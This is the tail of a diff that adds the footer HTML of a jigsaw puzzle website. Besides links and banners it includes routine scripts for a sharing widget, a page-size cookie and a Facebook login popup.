+<tbody><tr><td colspan="3" style="text-align:center;"><br/>
+<div class="playbutton" id="playlink" style="background-image:url(https://cdn.jspuzzles.com/artwork/playbutton.jpg);background-repeat:no-repeat;"></div>
+</td></tr>
+</tbody></table><br/>
+<table align="center" border="0" cellpadding="0" cellspacing="0" dir="ltr" style="width:940px;direction:ltr;" width="940px">
+<tbody><tr><td style="text-align:center;vertical-align:middle;">
+<div id="sizelinks"></div>
+</td>
+<td style="text-align:center;vertical-align:middle;">
+<div dir="ltr" id="cutlinks"></div>
+</td></tr>
+<tr><td colspan="2" style="text-align:center;vertical-align:middle;padding-top:15px;">
+<div dir="ltr" id="scalelinks"></div>
+<div style="line-height:23px;"><br/></div>
+<span class="wincompetespan" id="wincompetespan" onclick="switchcompete(0, 0, 0, 0, 0, 0);" style="position:absolute;bottom:26px;right:22px;display:inline;">Turn off competitive mode</span>
+<span class="wincompetespan" id="winnocompetespan" onclick="switchcompete(1,'en',currentwinpuzzlenum,selectedcut, selectedsize,'normal');" style="position:absolute;bottom:26px;right:22px;display:none;">Turn on competitive mode</span>
+</td></tr>
+</tbody></table>
+</div>
+<br/><br/>
+<div align="center" class="indexfooterdiv" style="background-image:url(https://cdn.jspuzzles.com/artwork/background-bottom-min.png);background-repeat:repeat-x;">
+<table align="center" border="0" cellpadding="0" cellspacing="0" class="maintab">
+<tbody><tr><td align="center" colspan="3">
+<img alt="Play free Jigsaw puzzles online" class="bg-logofooter" src="https://cdn.jspuzzles.com/artwork/img_trans.gif"/>
+<br/>
+<span style="font-size:16px;color:#E62A38;">
+<a class="indexfootlink" href="https://www.jspuzzles.com/en/introduction.php">Help and Support</a> | <a class="indexfootlink" href="https://www.jspuzzles.com/guestbook.php">JSPuzzles' Guestbook</a> | <a class="indexfootlink" href="https://www.jspuzzles.com/en/search.php">Search</a> | <a class="indexfootlink" href="https://www.jspuzzles.com/en/contactus.php">Contact Us</a>
+</span>
+</td></tr>
+<tr><td align="center" colspan="3">
+<br/>
+<img alt="" class="bg-flags" id="langmapimg" name="langmapimg" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="border:0px;" usemap="#langmap"/>
+<map id="langmap" name="langmap">
+<area alt="English" coords="0,0,30,16" href="https://www.jspuzzles.com" shape="rect"/>
+<area alt="German" coords="31,0,62,16" href="https://www.jspuzzles.com/indexde.php" shape="rect"/>
+<area alt="Italian" coords="64,0,94,16" href="https://www.jspuzzles.com/indexit.php" shape="rect"/>
+<area alt="Hebrew" coords="97,0,127,16" href="https://www.jspuzzles.com/indexhe.php" shape="rect"/>
+<area alt="Spanish" coords="129,0,159,16" href="https://www.jspuzzles.com/indexes.php" shape="rect"/>
+<area alt="Chinese" coords="161,0,191,16" href="https://www.jspuzzles.com/indexcn.php" shape="rect"/>
+<area alt="Portuguese" coords="193,0,223,16" href="https://www.jspuzzles.com/indexpt.php" shape="rect"/>
+<area alt="French" coords="225,0,255,16" href="https://www.jspuzzles.com/indexfr.php" shape="rect"/>
+</map>
+</td></tr></tbody></table>
+<br/>
+<a href="https://www.solitairebliss.com" title="Solitaire Bliss"><img alt="Free Solitaire" class="bg-solitaire_banner" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="border:0"/></a>
+  
+<a href="http://www.mahjongdragon.com"><img alt="Play MahJong Solitaire" class="bg-mahjong_banner" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="border:0"/></a>
+  
+<a href="http://www.funzola.com"><img alt="Addicting flash games" class="bg-funzola_banner" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="border:0"/></a>
+  
+<a href="http://www.webhangman.com"><img alt="Hangman" class="bg-webhangman_banner" src="https://cdn.jspuzzles.com/artwork/img_trans.gif" style="border:0"/></a>
+<br/><br/>
+<a class="indexfootlink2" href="https://www.jspuzzles.com">Jigsaw Puzzles</a> | <a class="indexfootlink2" href="https://www.jspuzzles.com/jigsaw-history.php">The History of Jigsaw Puzzles</a> | <a class="indexfootlink2" href="https://www.jspuzzles.com/aboutus.php">About Jigsaw Puzzles</a> | <a class="indexfootlink2" href="https://www.jspuzzles.com/en/contactus.php">Contact Us</a> | <a class="indexfootlink2" href="http://www.playsolitaire.org">Play Solitaire</a> | <a class="indexfootlink2" href="https://www.jspuzzles.com/links.php">Links</a> | Graphic design by Joto Design<br/>
+While using this site, you agree to have read and accepted our <a class="indexfootlink2" href="en/terms.php">Terms of use Policy</a> | <a class="indexfootlink2" href="en/privacy-policy.php">Privacy Policy</a><br/>Copyright © 2007-2019 ,All rights reserved.<br/><script type="text/javascript">
+setCookie("JSPuzzles3", pageheight+"~"+pagewidth, 365);
+</script>
+<br/>
+</div>
+<script type="text/javascript">
+  function downloadJSAtOnload()
+  {
+
+    // var deferjs = document.createElement("script");
+    // deferjs.src = "/js/bootstrap.min.js";
+    // document.body.appendChild(deferjs);
+
+    // // defer things put in defer.js
+    // // - analytics
+    // var deferjs = document.createElement("script");
+    // deferjs.src = "/defer-js.php";
+    // document.body.appendChild(deferjs);
+
+    // defer gametools-1-84.js
+    // var deferjs = document.createElement("script");
+    // deferjs.src = "/gametools-1-84.js";
+    // document.body.appendChild(deferjs);
+
+          var deferjs = document.createElement("script");
+      deferjs.src = "https://cdn.jspuzzles.com/js/addthis_widget_300.js#pubid=jspuzzles";
+      document.body.appendChild(deferjs);
+
+      }
+  if (window.addEventListener)
+  window.addEventListener("load", downloadJSAtOnload, false);
+  else if (window.attachEvent)
+  window.attachEvent("onload", downloadJSAtOnload);
+  else window.onload = downloadJSAtOnload;
+</script>
+<style>
+.bg-facebooklogin {
+    width: 133px; height: 32px;
+    background: url('https://cdn.livesudoku.com/artwork/css_sprites-min.png') -160px -249px;
+}
+</style>
+<script type="text/javascript">
+/* -----------------------------------------------------------------------------------------
+   IdiotMinds - http://idiotminds.com
+   -----------------------------------------------------------------------------------------
+*/
+(function (jQuery) {
+    jQuery.oauthpopup = function (options) {
+        options.windowName = options.windowName || 'ConnectWithOAuth';
+        options.windowOptions = options.windowOptions || 'location=0,status=0,width='+options.width+',height='+options.height+',scrollbars=1';
+        options.callback = options.callback || function () {
+            window.location.reload();
+        };
+        var that = this;
+        that._oauthWindow = window.open(options.path, options.windowName, options.windowOptions);
+        that._oauthInterval = window.setInterval(function () {
+            if (that._oauthWindow.closed) {
+                window.clearInterval(that._oauthInterval);
+                options.callback();
+            }
+        }, 1000);
+    };
+})(jQuery);
+
+$(document).ready(function(){
+    $('#facebookl').click(function(e){
+        $.oauthpopup({
+            path: 'https://www.jspuzzles.com/facebook/fblogin.php',
+			width:600,
+			height:500,
+            callback: function(){
+                window.location.reload();
+            }
+        });
+		e.preventDefault();
+    });
+});
+
+</script>
+<div id="hintbox"></div><script src="https://cdn.jspuzzles.com/js/addthis_widget_300.js#pubid=jspuzzles"></script></body></html>
